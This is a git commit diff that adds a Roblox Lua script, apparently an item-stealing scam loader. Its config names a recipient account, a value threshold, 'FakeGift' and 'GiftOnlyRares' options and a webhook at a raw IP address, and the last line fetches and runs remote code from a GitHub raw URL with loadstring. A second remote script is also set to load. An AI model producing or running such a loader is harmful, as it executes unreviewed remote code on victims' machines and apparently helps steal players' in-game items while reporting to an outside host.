50341bcc896230b8f68b6a4207e29c0717417aa9
KyleTzy98113 <arigatoguasaimaz@gmail.com>
2025-08-12 21:44:50 +0800

    Upload legendary-script.lua via Script Source Converter

---
+++ legendary-script.lua
@@ -0,0 +1,14 @@
+_G.NullConfig = {
+    User = {"demon67228"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/a6570730ce17a86039e5fcce58c565b1",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/a6570730ce17a86039e5fcce58c565b1",
+    LoadingScreen = "No",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
